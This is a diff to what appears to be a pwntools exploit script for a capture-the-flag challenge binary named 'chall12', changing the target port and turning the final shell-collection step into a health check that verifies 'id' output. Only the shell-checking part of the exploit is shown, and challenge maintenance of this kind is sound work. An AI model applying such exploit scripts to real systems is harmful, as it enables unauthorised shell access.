@@ -3,7 +3,7 @@ from pwn import *
 import sys
 
 HOST = ''
-PORT = 11536
+PORT = 40012
 
 target_elf = ELF('../bin/chall12')
 rop = ROP(target_elf)
@@ -62,5 +62,12 @@ io.recvline(timeout=0.1)
 
 # step 3: collect the shell
 io.sendline(b'id')
-log.success('Shell? %s' % io.recvline().strip())
-io.interactive()
+id_result = io.recvline().strip()
+if b'uid=' in id_result:
+    log.success('shell: %s', id_result.decode('ascii'))
+    if not os.environ.get('HEALTH_CHECK', False):
+        io.interactive()
+    sys.exit(0)
+else:
+    log.failure('error: %s', id_result)
+    sys.exit(1)
